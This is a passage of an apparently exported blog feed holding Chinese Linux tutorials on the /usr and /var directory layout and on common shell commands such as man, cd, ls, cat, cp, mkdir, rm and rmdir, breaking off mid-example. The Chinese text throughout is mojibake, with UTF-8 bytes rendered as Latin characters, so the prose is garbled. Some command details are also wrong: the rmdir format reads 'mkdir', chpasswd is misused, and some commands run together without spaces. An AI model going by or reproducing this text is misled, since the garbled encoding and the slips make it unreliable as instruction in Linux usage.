alt="image-20210214220013565"></p><table><thead><tr><th>ç›®å½•</th><th>åº”æ”¾ç½®çš„æ–‡ä»¶å†…å®¹</th></tr></thead><tbody><tr><td>/usr/bin/</td><td>ç»å¤§éƒ¨åˆ†çš„ç”¨æˆ·å¯ä½¿ç”¨å‘½ä»¤éƒ½åœ¨æ­¤å¤„</td></tr><tr><td>/usr/include/</td><td>C/C++çš„å¤´æ–‡ä»¶,åŒ…å«æ–‡ä»¶éƒ½åœ¨æ­¤å¤„</td></tr><tr><td>/usr/lib/</td><td>å„ç±»åº”ç”¨è½¯ä»¶çš„å‡½æ•°åº“,ç›®æ ‡æ–‡ä»¶ä»¥åŠä¸€äº›éæƒ¯ç”¨çš„æ‰§è¡Œæ–‡ä»¶æˆ–è„šæœ¬</td></tr><tr><td>/usr/local/</td><td>ç”¨æˆ·è‡ªè¡Œå®‰è£…çš„è½¯ä»¶éƒ½åœ¨æ­¤å¤„,åŒºåˆ«äºå‘è¡Œç‰ˆè‡ªå¸¦çš„è½¯ä»¶</td></tr><tr><td>/usr/sbin/</td><td>éç³»ç»Ÿæ­£å¸¸è¿è¡Œæ‰€éœ€è¦çš„ç³»ç»Ÿå‘½ä»¤</td></tr><tr><td>/usr/share/</td><td>æ”¾ç½®å…±äº«æ–‡ä»¶</td></tr><tr><td>/usr/src/</td><td>ä¸€èˆ¬æºç å­˜æ”¾åœ¨è¿™é‡Œ,è€Œå†…æ ¸æºç å­˜æ”¾åœ¨/usr/src/linuxä¸‹</td></tr></tbody></table><p>æ˜¾ç„¶ï¼Œ/usrä¸ / ä¸‹æœ‰ä¸å°‘ç›¸åŒçš„ç›®å½•,æ¥ä¸‹æ¥å°±çœ‹çœ‹å®ƒä»¬çš„åŒºåˆ«:</p><ul><li>/bin ä¸ /usr/bin</li></ul><p>/binæ˜¯æ ¹ç›®å½•ä¸‹çš„ç›®å½•,å…¶ä¸å¼€æœºè¿‡ç¨‹æœ‰å…³,æ‰€ä»¥è¦æ”¾åœ¨å¼€æœºæ—¶å°±æŒ‚è½½çš„/ç›®å½•ä¸‹</p><p>/usr/bin ä¸­å­˜æ”¾çš„ä¹Ÿæ˜¯ä¸€èˆ¬ç”¨æˆ·æ‰€èƒ½ç”¨åˆ°çš„å¤§å¤šæ•°å‘½ä»¤,ä½†æ˜¯ä¸å¼€æœºè¿‡ç¨‹ä¸æŒ‚é’©</p><ul><li>/lib ä¸ /usr/lib</li></ul><p>/libä¸­æ”¾ç½®çš„æ˜¯åœ¨å¼€æœºæ—¶é¦–å…ˆä¼šç”¨åˆ°çš„å‡½æ•°åº“</p><p>/usr/libä¸­æ”¾ç½®çš„åˆ™æ˜¯å„ç§åº”ç”¨è½¯ä»¶çš„å‡½æ•°åº“,ä¸ä¸€å®šå¼€æœºæ—¶ä¼šç”¨åˆ°</p><ul><li>/sbin ä¸ /usr/sbin</li></ul><p>/sbinä¸­å­˜æ”¾çš„æ˜¯è¶…çº§ç”¨æˆ· rootä¸€èˆ¬ä½¿ç”¨çš„å‘½ä»¤æ”¾ç½®ç€ç³»ç»Ÿç®¡ç†æ‰€å¿…é¡»çš„ç¨‹å¼</p><p>/usr/sbinä¸­æ”¾ç½®çš„åˆ™ä¸ä¸€å®šæ˜¯ç³»ç»Ÿæ­£å¸¸è¿è¡Œæ‰€å¿…é¡»çš„ç³»ç»ŸæŒ‡ä»¤</p><ul><li>/opt ä¸ /usr/local</li></ul><p>/optç›®å½•ä¸‹å­˜æ”¾ç¬¬ä¸‰æ–¹è½¯ä»¶,å³å¹¶éå‘è¡Œç‰ˆLinuxå®‰è£…æ—¶å°±è£…çš„è½¯ä»¶</p><p>/usr/localç›®å½•ä¸‹å­˜æ”¾ç³»ç»Ÿç®¡ç†å‘˜åœ¨æœ¬æœºå®‰è£…çš„è½¯ä»¶,ä¸€èˆ¬ç»ç”± apt æˆ– yum å®‰è£…çš„è½¯ä»¶éƒ½æ”¾ç½®äºæ­¤</p><h2 id="var-ç›®å½•"><a href="#var-ç›®å½•" class="headerlink" title="/var ç›®å½•"></a>/var ç›®å½•</h2><p>/var (variable)æ˜¯ä¸ç³»ç»Ÿè¿ä½œè¿‡ç¨‹æœ‰å…³çš„ç›®å½•ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/a8OuiWyFYDneA2C.png" alt="image-20210214221639768"></p><table><thead><tr><th>ç›®å½•</th><th>æ”¾ç½®çš„æ–‡ä»¶å†…å®¹</th></tr></thead><tbody><tr><td>/var/cache/</td><td>åº”ç”¨ç¨‹åºæœ¬èº«äº§ç”Ÿçš„ç¼“å­˜æ–‡ä»¶</td></tr><tr><td>/var/lib</td><td>ç¨‹åºè¿è¡Œæ—¶éœ€è¦çš„æ•°æ®æ”¾ç½®çš„ç›®å½•</td></tr><tr><td>/var/lock</td><td>ç¨‹åºé”,å¯¹äºåªèƒ½åŒæ—¶ä¸€ä¸ªç”¨æˆ·ä½¿ç”¨çš„ç¨‹åºä¸Šé”,é˜²æ­¢ä¸¤äººåŒæ—¶ä½¿ç”¨</td></tr><tr><td>/var/log</td><td>ç™»å½•æ–‡ä»¶æ”¾ç½®çš„ç›®å½•</td></tr><tr><td>/var/mail</td><td>ä¸ªäººä¿¡ç®±çš„ç›®å½•</td></tr><tr><td>/var/run</td><td>ç¨‹åºçš„PIDæ”¾ç½®ç›®å½•</td></tr><tr><td>/var/spool</td><td>é€šå¸¸æ”¾ç½®ä¸€äº›é˜Ÿåˆ—æ•°æ®</td></tr></tbody></table><h1 id="ç»“è¯­"><a href="#ç»“è¯­" class="headerlink" title="ç»“è¯­"></a>ç»“è¯­</h1><blockquote><p>å…³äºç« æœ«çš„ç¼–ç¨‹å®è·µï¼šå®ç°è‡ªå·±çš„ ls å‘½ä»¤ï¼Œè¿™é‡Œå…ˆç»™å‡ºå­¦é•¿çš„ä»£ç ï¼Œå¾…æ—¥åå†ç»†å“ã€‚(æ»‘ç¨½-&gt; &lt;-)</p><p><a href="https://blog.csdn.net/qq_45858169/article/details/105193172">Linuxç³»ç»Ÿç¼–ç¨‹ï¼šmy_ls(lã€Rã€Aã€rã€nã€hã€iã€é¢œè‰²çš„å®ç°)</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linuxä¹‹å¸¸ç”¨å‘½ä»¤</title>
      <link href="posts/18120.html"/>
      <url>posts/18120.html</url>
      
        <content type="html"><![CDATA[<p>åœ¨äº†è§£Linux å¸¸ç”¨å‘½ä»¤ä¹‹å‰ï¼Œæœ‰å¿…è¦çŸ¥é“ä»¥ä¸‹ä¸¤ä¸ªæ¦‚å¿µã€‚</p><h1 id="Linux-ç»ˆç«¯"><a href="#Linux-ç»ˆç«¯" class="headerlink" title="Linux ç»ˆç«¯"></a>Linux ç»ˆç«¯</h1><p>Linux æŠŠæ˜¾ç¤ºå™¨å’Œé”®ç›˜åˆç§°ä¸ºç»ˆç«¯ï¼Œå› ä¸ºå®ƒä»¬å¯ä»¥å¯¹ç³»ç»Ÿè¿›è¡Œæ§åˆ¶å¹¶ä¸”å¯ä»¥ç”¨è½¯ä»¶çš„æ–¹å¼æ¥å®ç°ï¼Œæ‰€ä»¥åˆç§°ä¸ºè™šæ‹Ÿæ§åˆ¶å°ã€‚</p><h1 id="Linux-Shell"><a href="#Linux-Shell" class="headerlink" title="Linux Shell"></a>Linux Shell</h1><p>åœ¨ç»ˆç«¯ä¸Šï¼Œé€šè¿‡è¾“å…¥Shell å‘½ä»¤æ¥æ§åˆ¶å’Œä½¿ç”¨è®¡ç®—æœºã€‚Shell æ˜¯ä¸€ä¸ªå‘½ä»¤è§£é‡Šå™¨ï¼Œå®ƒé€šè¿‡æ¥å—ç”¨æˆ·è¾“å…¥çš„å‘½ä»¤æ¥å¯åŠ¨ã€æš‚åœã€åœæ­¢ç¨‹åºçš„è¿è¡Œæˆ–å¯¹è®¡ç®—æœºè¿›è¡Œæ§åˆ¶ã€‚</p><p>Shellæœ‰ä¸¤ç§æç¤ºç¬¦ï¼šä»¥**#**ä¸ºæç¤ºç¬¦è¡¨æ˜è¯¥ç»ˆç«¯æ˜¯ç”±root ç”¨æˆ·æ‰“å¼€çš„ï¼Œrootç”¨æˆ·å…·æœ‰ç³»ç»Ÿæœ€é«˜æƒé™ï¼Œå› æ­¤å¯ä»¥è¾“å…¥ä»»ä½•å¯ç”¨çš„å‘½ä»¤ï¼Œè€Œä¸€èˆ¬ç”¨æˆ·æ‰“å¼€çš„ç»ˆç«¯çš„æç¤ºç¬¦æ˜¯ $ ã€‚æç¤ºç¬¦çš„å…¶ä»–éƒ¨åˆ†åˆ†åˆ«è¡¨ç¤ºï¼š[ç™»å½•ç”¨æˆ·å@ä¸»æœºåå½“å‰ç›®å½•]ã€‚</p><p>Shellå‘½ä»¤çš„åŸºæœ¬æ ¼å¼æ˜¯:<br>å‘½ä»¤å  [é€‰é¡¹]  &lt;å‚æ•°1&gt;  &lt;å‚æ•°2&gt;.â€¦..</p><p>å…¶ä¸­æ–¹æ‹¬å·ä¸­çš„é€‰é¡¹å¯¹å‘½ä»¤æ¥è¯´æ˜¯å¯é€‰çš„ï¼Œä¸€æ¡å‘½ä»¤å¯ä»¥æœ‰0ä¸ªæˆ–å¤šä¸ªå‚æ•°ã€‚é€‰é¡¹æ˜¯å¯¹å‘½ä»¤çš„ç‰¹åˆ«å®šä¹‰ï¼Œä¹Ÿå¯ä»¥ç†è§£ä¸ºé€‰é¡¹å‘Šè¯‰å‘½ä»¤å…·ä½“åšä»€ä¹ˆã€‚é€‰é¡¹é€šå¸¸ä»¥â€œ-â€å¼€å§‹ï¼Œåæ¥ä¸€ä¸ªæˆ–å¤šä¸ªå­—æ¯ï¼Œå¦‚ ls-alï¼Œæœ‰çš„é€‰é¡¹ä»¥â€œâ€“â€å¼€å¤´ï¼Œåé¢ä¸€èˆ¬è·Ÿç€ä¸€ä¸ªå•è¯ï¼Œæ¯”å¦‚â€“numberã€‚å¾ˆå¤šâ€œâ€“â€æ ¼å¼çš„é€‰é¡¹å¯ä»¥ç”¨â€œ-â€åŠ ä¸Šç¬¬ä¸€ä¸ªå­—æ¯æ¥æ›¿ä»£ï¼Œå¦‚â€“number_å¯ä»¥ç”¨-næ¥æ›¿ä»£ã€‚åœ¨ Shellä¸‹è¾“å…¥ç›¸åº”çš„å‘½ä»¤å¹¶æŒ‰å›è½¦é”®ï¼ŒShellå°±æ‰§è¡Œå‘½ä»¤ã€‚å¦‚æœæ²¡æœ‰æ­¤å‘½ä»¤ï¼ŒShellä¼šæç¤ºÂ·â€œcommand not foundâ€ï¼Œè¡¨æ˜æ²¡æœ‰è¿™ä¸ªå‘½ä»¤ã€‚Shell å‘½ä»¤æ˜¯åŒºåˆ†å¤§å°å†™çš„ï¼Œä¸€æ¡å‘½ä»¤åªè¦æœ‰ä¸€ä¸ªå­—æ¯çš„å¤§å°å†™å‘ç”Ÿå˜åŒ–ï¼Œç³»ç»Ÿå°±è®¤ä¸ºæ˜¯ä¸€æ¡ä¸åŒçš„å‘½ä»¤ã€‚å¯ä»¥ç”¨åˆ†å·â€œ;â€æ¥è¿æ¥å¤šä¸ªå‘½ä»¤ï¼ŒShell ä¼šä¾æ¬¡æ‰§è¡Œè¿™äº›å‘½ä»¤ã€‚</p><h1 id="man-page-ä¸-info-page"><a href="#man-page-ä¸-info-page" class="headerlink" title="man page ä¸ info page"></a>man page ä¸ info page</h1><p>Linuxå‘½ä»¤æ•°é‡ä¼—å¤šï¼Œä½ èƒ½å®Œå…¨æŒæ¡å®ƒä»¬çš„åŠŸèƒ½å—ï¼Ÿä½ èƒ½äº†è§£å®ƒä»¬çš„æ¯ä¸€ä¸ªé€‰é¡¹ï¼Œæ¯ä¸€ä¸ªå‚æ•°å—ï¼Ÿè¿™ä¸ªæ—¶å€™å°±éœ€è¦ç”¨åˆ°å¼ºå¤§çš„åœ¨çº¿æ±‚åŠ© <strong>man page</strong></p><p>man ä¹Ÿæ˜¯å‘½ä»¤ï¼Œä¸ºmanual(æ“ä½œè¯´æ˜ï¼‰<code>man command</code>å³å¯æ˜¾ç¤ºæ­¤å‘½ä»¤çš„æ“ä½œè¯´æ˜ã€‚</p><p>ä¸¾ä¸ªä¾‹å­ï¼š</p><p>man ls å³å¯æ˜¾ç¤ºå…³äº ls å‘½ä»¤çš„æ‰€æœ‰å†…å®¹ï¼ŒåŒ…æ‹¬å…¶ç”¨æ³•ï¼Œç­‰çº§ï¼Œç›¸å…³ç¯å¢ƒå‚æ•°ç­‰ä¸€ç³»åˆ—ä¿¡æ¯</p><p>è€Œä½¿ç”¨ manå‘½ä»¤æ—¶ä¼šè¿›å…¥ä¸€ä¸ªç•Œé¢ï¼Œæ­¤å³æ‰€è°“çš„ man pageï¼Œåœ¨å…¶ä¸­ä¹Ÿå¯ä»¥ä½¿ç”¨è®¸å¤šå¿«æ·é”®è¿›è¡Œæ“ä½œã€‚</p><blockquote><p>å¯ä»¥è¯´ï¼Œé€šè¿‡manå‘½ä»¤å³å¯äº†è§£åˆ°æ‰€æœ‰çš„å‘½ä»¤ç›¸å…³çš„æ“ä½œè¯´æ˜ã€‚è™½ç„¶Linuxä¸­æœ‰è®¸å¤šè®¸å¤šçš„å‘½ä»¤ï¼Œä½ èƒŒä¸å®Œæ‰€æœ‰çš„å‘½ä»¤ï¼Œä½ ä¹Ÿä¸éœ€è¦èƒŒæ‰€æœ‰çš„å‘½ä»¤ï¼Œè®°ä½å¹³æ—¶å¸¸ç”¨çš„å‘½ä»¤ï¼Œç„¶åçµæ´»ä½¿ç”¨man ä¸ Tabé”®è¡¥å…¨å³å¯å®Œæˆè®¸å¤šæ“ä½œã€‚</p></blockquote><p>info pageçš„ç”¨æ³•ä¸ man pageåŸºæœ¬ç±»ä¼¼ï¼Œä½†æ˜¯ï¼Œåœ¨infoä¸­å°†æ–‡ä»¶æ•°æ®æŠ˜å æˆä¸€ä¸ªä¸ªæ®µè½ï¼Œæ›´æ–¹ä¾¿ä½¿ç”¨è€…çš„æŸ¥è¯¢ä¸æŸ¥çœ‹ã€‚</p><h1 id="å‡ ä¸ªç®€å•å‘½ä»¤"><a href="#å‡ ä¸ªç®€å•å‘½ä»¤" class="headerlink" title="å‡ ä¸ªç®€å•å‘½ä»¤"></a>å‡ ä¸ªç®€å•å‘½ä»¤</h1><ul><li><code>date</code> æ˜¾ç¤ºå½“å‰æ—¥æœŸä¸æ—¶é—´</li><li><code>cal</code> æ˜¾ç¤ºæœ¬æœˆæ—¥å†ï¼›<code>cal [month] [year]</code> æ˜¾ç¤ºæŒ‡å®šæ—¶é—´æ—¥å†</li><li><code>bc</code> æ‰“å¼€è®¡ç®—å™¨ï¼ˆæ•°æ®é»˜è®¤æ•´å‹ï¼‰ï¼›å¯é€šè¿‡<code>scale = number</code> ä¿ç•™å°æ•°ä½æ•°ï¼Œnumberå³ä¸ºè¦ä¿ç•™çš„å°æ•°ä½æ•°ï¼›<code>quit</code> é€€å‡ºè®¡ç®—å™¨</li><li> <code>pwd</code> æ˜¾ç¤ºå½“å‰ç›®å½•çš„è·¯å¾„</li><li> <code>du -h file</code> æŸ¥çœ‹æ–‡ä»¶å¤§å°</li><li> <code>useradd zhang3</code> åˆ›å»ºæ–°ç”¨æˆ·å¼ ä¸‰</li><li> <code>passwd zhang3</code> è®¾ç½®ç”¨æˆ·å¯†ç </li><li> <code>chpasswd zhang3</code> æ›´æ”¹ç”¨æˆ·å¯†ç </li><li> <code>userdel zhang3</code> åˆ é™¤ç”¨æˆ·å¼ ä¸‰</li></ul><h1 id="å‡ ä¸ªå¸¸ç”¨çƒ­é”®"><a href="#å‡ ä¸ªå¸¸ç”¨çƒ­é”®" class="headerlink" title="å‡ ä¸ªå¸¸ç”¨çƒ­é”®"></a>å‡ ä¸ªå¸¸ç”¨çƒ­é”®</h1><ul><li>&lt; Tab &gt;é”®è¡¥å…¨ </li></ul><p>è¾“å…¥å‘½ä»¤ã€ç›®å½•åæˆ–æ–‡ä»¶åçš„å¼€å¤´ä¸€ä¸ªæˆ–å‡ ä¸ªå­—æ¯åæŒ‰ä¸‹ <strong>&lt; Tab &gt;é”®</strong>ï¼ŒShell ä¼šåœ¨ç›¸åº”ç›®å½•é‡Œè¿›è¡ŒåŒ¹é…ï¼Œè‡ªåŠ¨è¡¥é½å‘½ä»¤ã€ç›®å½•åæˆ–æ–‡ä»¶åã€‚åœ¨å‘½ä»¤ã€ç›®å½•åæˆ–æ–‡ä»¶åå¾ˆé•¿æˆ–éš¾ä»¥è®°å¿†æ—¶ï¼Œè‡ªåŠ¨è¡¥é½åŠŸèƒ½ä¼šå¾ˆæœ‰ç”¨ã€‚</p><ul><li>&lt;â†‘&gt;å’Œ&lt;â†“&gt;é”®</li></ul><p>å¯ä»¥é€šè¿‡æŒ‰&lt;â†‘&gt;æˆ–&lt;â†“&gt;é”®æ¥æ˜¾ç¤ºæ‰§è¡Œè¿‡çš„å‘½ä»¤ï¼Œè¿™åœ¨é‡å¤æ‰§è¡ŒæŸäº›å‘½ä»¤æ—¶ä¼šç»™ç”¨æˆ·å¸¦æ¥å¾ˆå¤§çš„ä¾¿åˆ©ã€‚</p><ul><li>&lt; Ctrl &gt; + C ç»ˆæ­¢è¿›ç¨‹</li></ul><p>æœ‰æ—¶å€™é¿å…ä¸äº†çš„ï¼Œä¼šè¿›è¡Œäº†é”™è¯¯çš„è¿›ç¨‹ï¼Œé‚£ä¹ˆæ€ä¹ˆåŠï¼ŸæŒ‰ä¸‹&lt; Ctrl&gt; + Cå¯ä»¥è§£å†³è¿™ä¸ªè€Œé—®é¢˜ï¼Œä¼šå¼ºåˆ¶ç»ˆæ­¢è¿›ç¨‹ã€‚è™½ç„¶å¥½ç”¨ï¼Œä½†æ˜¯æœ‰çš„æ—¶å€™ï¼Œä¹Ÿéœ€è¦è°¨æ…ä½¿ç”¨ï¼Œä¸èƒ½è‚†æ„ä½¿ç”¨ï¼Œå¦åˆ™ä¼šå¼•èµ·é‡å¤§é”™è¯¯çš„å‡ºç°ã€‚</p><ul><li>&lt; Ctrl &gt; + D ç»“æŸè¾“å…¥</li></ul><p>ä½¿ç”¨&lt; Ctrl &gt; + Då¯è¿…é€Ÿç»“æŸä»é”®ç›˜çš„è¾“å…¥ï¼Œç›¸å½“äºè¾“å…¥exit()ä¸€æ ·ã€‚</p><ul><li>&lt; Ctrl &gt; + L  æ¸…ç†å±å¹•</li></ul><h1 id="æ–‡ä»¶ä¸ç›®å½•ç®¡ç†å¸¸ç”¨å‘½ä»¤"><a href="#æ–‡ä»¶ä¸ç›®å½•ç®¡ç†å¸¸ç”¨å‘½ä»¤" class="headerlink" title="æ–‡ä»¶ä¸ç›®å½•ç®¡ç†å¸¸ç”¨å‘½ä»¤"></a>æ–‡ä»¶ä¸ç›®å½•ç®¡ç†å¸¸ç”¨å‘½ä»¤</h1><h2 id="cd-æ”¹å˜å½“å‰ç›®å½•å‘½ä»¤"><a href="#cd-æ”¹å˜å½“å‰ç›®å½•å‘½ä»¤" class="headerlink" title="cd æ”¹å˜å½“å‰ç›®å½•å‘½ä»¤"></a>cd æ”¹å˜å½“å‰ç›®å½•å‘½ä»¤</h2><p>æ ¼å¼ï¼šcd &lt;ç›®å½•å&gt;</p><p>ä¾‹å¦‚ï¼šæ‰§è¡Œå‘½ä»¤ <code>cd/home/admin</code>ï¼Œåˆ™åˆ‡æ¢åˆ°ç›®å½•/home/admin ä¸‹ã€‚</p><p>ä¾‹å¦‚ï¼šæ‰§è¡Œå‘½ä»¤ <code>cdï½</code>ï¼Œåˆ™å½“å‰ç›®å½•ä½äºç”¨æˆ·çš„ä¸»ç›®å½•ä¸‹ã€‚</p><p>ä¾‹å¦‚ï¼šæ‰§è¡Œå‘½ä»¤ <code>cd.. </code>ï¼Œåˆ‡æ¢åˆ°å½“å‰ç›®å½•çš„çˆ¶ç›®å½•ã€‚</p><p>ä¾‹å¦‚ï¼šæ‰§è¡Œå‘½ä»¤ <code>cd - </code>ï¼Œåˆ‡æ¢åˆ°å‰ä¸€ä¸ªç›®å½•ã€‚</p><h2 id="ls-æ˜¾ç¤ºç›®å½•æˆ–æ–‡ä»¶ä¿¡æ¯å‘½ä»¤"><a href="#ls-æ˜¾ç¤ºç›®å½•æˆ–æ–‡ä»¶ä¿¡æ¯å‘½ä»¤" class="headerlink" title="ls æ˜¾ç¤ºç›®å½•æˆ–æ–‡ä»¶ä¿¡æ¯å‘½ä»¤"></a>ls æ˜¾ç¤ºç›®å½•æˆ–æ–‡ä»¶ä¿¡æ¯å‘½ä»¤</h2><p>æ ¼å¼ï¼šls [é€‰é¡¹] &lt;ç›®å½•æˆ–æ–‡ä»¶å&gt;</p><p>ä¸»è¦é€‰é¡¹å¦‚ä¸‹ï¼š<br>-aï¼šæ˜¾ç¤ºæ‰€æœ‰çš„æ–‡ä»¶å’Œç›®å½•ã€‚</p><p>-lï¼šä»¥é•¿æ ¼å¼æ˜¾ç¤ºæ–‡ä»¶ä¿¡æ¯ã€‚</p><p>-tï¼šå°†ç»“æœæŒ‰ä¿®æ”¹æ—¶é—´è¿›è¡Œæ’åºï¼Œæ–°çš„æ–‡ä»¶æˆ–ç›®å½•æ’åœ¨å‰é¢ã€‚</p><h2 id="cat-æ–‡ä»¶å†…å®¹æŸ¥çœ‹å’Œè¿æ¥å‘½ä»¤"><a href="#cat-æ–‡ä»¶å†…å®¹æŸ¥çœ‹å’Œè¿æ¥å‘½ä»¤" class="headerlink" title="cat æ–‡ä»¶å†…å®¹æŸ¥çœ‹å’Œè¿æ¥å‘½ä»¤"></a>cat æ–‡ä»¶å†…å®¹æŸ¥çœ‹å’Œè¿æ¥å‘½ä»¤</h2><p>æ ¼å¼ï¼šcat [é€‰é¡¹] &lt;æ–‡ä»¶1&gt; &lt;æ–‡ä»¶2&gt; â€¦.</p><p>è¯¥å‘½ä»¤ç”¨äºæŠŠå‡ ä¸ªæ–‡ä»¶çš„å†…å®¹è¿æ¥åæ˜¾ç¤ºåœ¨å±å¹•ä¸Šã€‚ä¸»è¦é€‰é¡¹å¦‚ä¸‹ï¼š</p><p>-nï¼šå¯¹å†…å®¹è¿›è¡ŒæŒ‰è¡Œç¼–å·è¾“å‡ºã€‚</p><p>ä¾‹å¦‚ï¼šæ‰§è¡Œå‘½ä»¤<code>cat -n test.c</code>ï¼Œè¡¨ç¤ºå°†æ–‡ä»¶test.cçš„å†…å®¹åŠ ä¸Šè¡Œå·åæ˜¾ç¤ºè¾“å‡ºã€‚<br>ä¾‹å¦‚ï¼šæ‰§è¡Œå‘½ä»¤<code>cat test1.c test2.c</code>ï¼Œè¡¨ç¤ºå°†æ–‡ä»¶test1.cå’Œ test2.cçš„å†…å®¹ä¸²æ¥åœ¨ä¸€èµ·å¹¶è¾“å‡ºã€‚</p><blockquote><p>é’ˆå¯¹æ¯”è¾ƒå¤§çš„æ–‡ä»¶ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨<code>less</code>å‘½ä»¤æ‰“å¼€æŸä¸ªæ–‡ä»¶ã€‚ç±»ä¼¼vimï¼Œlesså¯ä»¥åœ¨è¾“å…¥<code>/</code>åè¿›å…¥æŸ¥æ‰¾æ¨¡å¼ï¼Œç„¶åæŒ‰<code>n</code>(N)å‘ä¸‹(ä¸Š)æŸ¥æ‰¾ã€‚<code>ç©ºæ ¼</code> å‘ä¸‹æ»šå±ç¿»é¡µï¼Œ<code>b</code> å‘ä¸Šæ»šå±ç¿»é¡µï¼Œ <code>q</code> é€€å‡ºless</p></blockquote><h2 id="cp-æ–‡ä»¶å¤åˆ¶å‘½ä»¤"><a href="#cp-æ–‡ä»¶å¤åˆ¶å‘½ä»¤" class="headerlink" title="cp æ–‡ä»¶å¤åˆ¶å‘½ä»¤"></a>cp æ–‡ä»¶å¤åˆ¶å‘½ä»¤</h2><p>æ ¼å¼ï¼šcp [é€‰é¡¹] &lt;æºæ–‡ä»¶æˆ–ç›®å½•&gt; &lt;ç›®æ ‡æ–‡ä»¶æˆ–ç›®å½•&gt;</p><p>è¯¥å‘½ä»¤ç”¨äºæŠŠä¸€ä¸ªæ–‡ä»¶æ‹·è´åˆ°å¦ä¸€ä¸ªæ–‡ä»¶æˆ–å°†å¤šä¸ªæ–‡ä»¶æ‹·è´åˆ°ä¸€ä¸ªç›®å½•ä¸‹ã€‚ä¸»è¦é€‰é¡¹å¦‚ä¸‹ï¼š</p><p>-rï¼šè‹¥æºç›®å½•ä¸‹è¿˜æœ‰æ–‡ä»¶æˆ–ç›®å½•ï¼Œåˆ™éƒ½æ‹·è´åˆ°ç›®çš„åœ°ã€‚</p><p>-fï¼šè‹¥ç›®æ ‡ç›®å½•ä¸‹å·²ç»æœ‰åŒåçš„æ–‡ä»¶ï¼Œåˆ™æŠŠå®ƒåˆ é™¤å¹¶æŠŠæºæ–‡ä»¶æ‹·è´åˆ°ç›®æ ‡ç›®å½•ä¸‹ã€‚</p><p>ä¾‹å¦‚ï¼šæ‰§è¡Œå‘½ä»¤<code>cp test.c tmp/program.c</code>ï¼Œè¡¨ç¤ºæŠŠå½“å‰ç›®å½•ä¸‹çš„test.cæ–‡ä»¶æ‹·è´åˆ°/tmpç›®å½•ä¸‹å¹¶å‘½åä¸ºprogram.c</p><h2 id="mkdir-åˆ›å»ºç›®å½•å‘½ä»¤"><a href="#mkdir-åˆ›å»ºç›®å½•å‘½ä»¤" class="headerlink" title="mkdir åˆ›å»ºç›®å½•å‘½ä»¤"></a>mkdir åˆ›å»ºç›®å½•å‘½ä»¤</h2><p>æ ¼å¼ï¼šmkdir [é€‰é¡¹] &lt;ç›®å½•&gt;</p><p>å¦‚æœæŒ‡å®šç›®å½•ä¸å­˜åœ¨åˆ™åˆ›å»ºå®ƒã€‚ä¸»è¦é€‰é¡¹å¦‚ä¸‹ï¼š</p><p>-pï¼šè‹¥è¦å»ºç«‹çš„ç›®å½•çš„ä¸Šå±‚ç›®å½•ä¸å­˜åœ¨ï¼Œåˆ™å…ˆåˆ›å»ºå®ƒã€‚</p><p>ä¾‹å¦‚ï¼šæ‰§è¡Œå‘½ä»¤<code>mkdir-p dir1/dir2</code>ï¼Œè¡¨ç¤ºåœ¨å½“å‰ç›®å½•ä¸‹åˆ›å»ºdir1/dir2ï¼Œå¦‚æœdir1ä¸å­˜åœ¨åˆ™å…ˆåˆ›å»ºå®ƒã€‚</p><h2 id="touch-åˆ›å»ºæ–‡ä»¶å‘½ä»¤"><a href="#touch-åˆ›å»ºæ–‡ä»¶å‘½ä»¤" class="headerlink" title="touch åˆ›å»ºæ–‡ä»¶å‘½ä»¤"></a>touch åˆ›å»ºæ–‡ä»¶å‘½ä»¤</h2><p>æ ¼å¼ï¼štouch &lt;æ–‡ä»¶&gt;</p><p>ä¾‹å¦‚ï¼šæ‰§è¡Œå‘½ä»¤<code> touch test.c</code> åœ¨å½“å‰ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªæ–‡ä»¶test.cï¼Œå‰ææ˜¯test.cæ–‡ä»¶ä¸å­˜åœ¨ã€‚</p><h2 id="rm-åˆ é™¤æ–‡ä»¶å‘½ä»¤"><a href="#rm-åˆ é™¤æ–‡ä»¶å‘½ä»¤" class="headerlink" title="rm åˆ é™¤æ–‡ä»¶å‘½ä»¤"></a>rm åˆ é™¤æ–‡ä»¶å‘½ä»¤</h2><p>æ ¼å¼ï¼šrm [é€‰é¡¹] &lt;æ–‡ä»¶æˆ–ç›®å½•&gt;</p><p>è¯¥å‘½ä»¤ç”¨äºåˆ é™¤æ–‡ä»¶ï¼Œä¸»è¦é€‰é¡¹å¦‚ä¸‹ï¼š</p><p>-rï¼šè‹¥ç›®å½•éç©º,åˆ™åˆ é™¤ç›®å½•ä¸‹æ‰€æœ‰çš„æ–‡ä»¶ã€‚</p><p>-fï¼šå¼ºåˆ¶åˆ é™¤ã€‚<br>ä¾‹å¦‚ï¼šæ‰§è¡Œå‘½ä»¤<code>rm *.c</code>ï¼Œè¡¨ç¤ºåˆ é™¤å½“å‰ç›®å½•ä¸‹æ‰€æœ‰ä»¥.cç»“å°¾çš„æ–‡ä»¶ã€‚<br>ä¾‹å¦‚ï¼šæ‰§è¡Œå‘½ä»¤<code>rm -rf tyq</code>ï¼Œè¡¨ç¤ºå¼ºåˆ¶åˆ é™¤ tyqç›®å½•ä¸‹æ‰€æœ‰çš„æ–‡ä»¶å’Œå­ç›®å½•ï¼Œå­ç›®å½•ä¸‹çš„æ–‡ä»¶æˆ–ç›®å½•éƒ½è¢«åˆ é™¤ã€‚</p><h2 id="rmdir-åˆ é™¤ç›®å½•å‘½ä»¤"><a href="#rmdir-åˆ é™¤ç›®å½•å‘½ä»¤" class="headerlink" title="rmdir åˆ é™¤ç›®å½•å‘½ä»¤"></a>rmdir åˆ é™¤ç›®å½•å‘½ä»¤</h2><p>æ ¼å¼ï¼šmkdir [é€‰é¡¹] &lt;ç›®å½•&gt;</p><p>å¦‚æœæŒ‡å®šç›®å½•ä¸ºç©ºå°±åˆ é™¤å®ƒï¼Œè‹¥ä¸ä¸ºç©ºåˆ™å‡ºç°é”™è¯¯ä¿¡æ¯ã€‚ä¸»è¦é€‰é¡¹å¦‚ä¸‹ï¼š</p><p>-pï¼šå½“åˆ é™¤æŒ‡å®šç›®å½•å,è‹¥è¯¥ç›®å½•çš„çˆ¶ç›®å½•ä¸ºç©º,åˆ™ä¹Ÿå°†å…¶åˆ é™¤ã€‚</p><p>ä¾‹å¦‚ï¼šæ‰§è¡Œå‘½ä»¤<code>rmdir -p 